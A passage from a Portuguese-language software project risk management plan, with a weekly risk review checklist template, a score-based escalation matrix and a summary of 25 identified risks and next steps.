    S0  S1  S2  S3  S4  S5  S6  S7

Objetivo: Reduzir exposure em 70% até go-live

```

## ✅ Risk Review Checklist

*Weekly (toda segunda-feira)*

```text
## Risk Review - Sprint X - Semana Y

### Riscos que materializaram:
- [ ] Nenhum ✅
- [ ] R__ - [Descrição] - Status: ____

### Novos riscos identificados:
- [ ] Nenhum ✅
- [ ] R__ - [Descrição] - Score: __ - Dono: ____

### Mudanças de score:
- [ ] R__ aumentou de __ para __ (razão: ____)
- [ ] R__ diminuiu de __ para __ (razão: ____)

### Ações de mitigação concluídas:
- [ ] R__ - [Ação] - Concluído ✅

### Próximas ações (esta semana):
- [ ] R__ - [Ação] - Responsável: ____ - Prazo: ____

### Escalações necessárias:
- [ ] Nenhuma ✅
- [ ] R__ - Escalar para: ____ - Motivo: ____

---
**Assinatura:** Tech Lead + PO + DevOps
**Data:** ____

```

## 🚨 Escalation Matrix

```text
┌─────────────────────────────────────────────────────────┐
│               MATRIZ DE ESCALAÇÃO                        │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Score 1-3 (Baixo):                                     │
│    └─► Resolver no nível do time                       │
│    └─► Reportar em Weekly Review                       │
│                                                          │
│  Score 4-6 (Médio):                                     │
│    └─► Escalar para Tech Lead + PO                     │
│    └─► Plano de mitigação em 24h                       │
│    └─► Reportar em Sprint Review                       │
│                                                          │
│  Score 7-8 (Alto):                                      │
│    └─► Escalar para Engineering Manager                │
│    └─► Plano de mitigação imediato                     │
│    └─► Reunião emergencial (stakeholders)              │
│    └─► Comunicação executiva                           │
│                                                          │
│  Score 9-10 (Crítico):                                  │
│    └─► Escalar para C-Level                            │
│    └─► War room ativada                                │
│    └─► Comunicação com clientes (se necessário)        │
│    └─► Plano de contingência ativado                   │
│                                                          │
└─────────────────────────────────────────────────────────┘

```

## 📚 Conclusão

* **Total de riscos identificados:** 25
* **Riscos críticos (9-10):** 3 (12%)
* **Riscos altos (7-8):** 8 (32%)
* **Riscos médios (4-6):** 10 (40%)
* **Riscos baixos (1-3):** 4 (16%)
* **Investimento em mitigação:** ~40h (incluído no buffer de 15%)
* **ROI de gestão de riscos:** Evitar 90% dos incidentes críticos

**Próximos passos:**

1. ✅ Aprovar matriz de riscos (Sprint 0)
2. ✅ Implementar mitigações (Sprint 1-3)
3. ✅ Review semanal (toda segunda 9h)
4. ✅ Update após cada incidente

**Risk Management is not optional - it's essential!** 🎯

```

```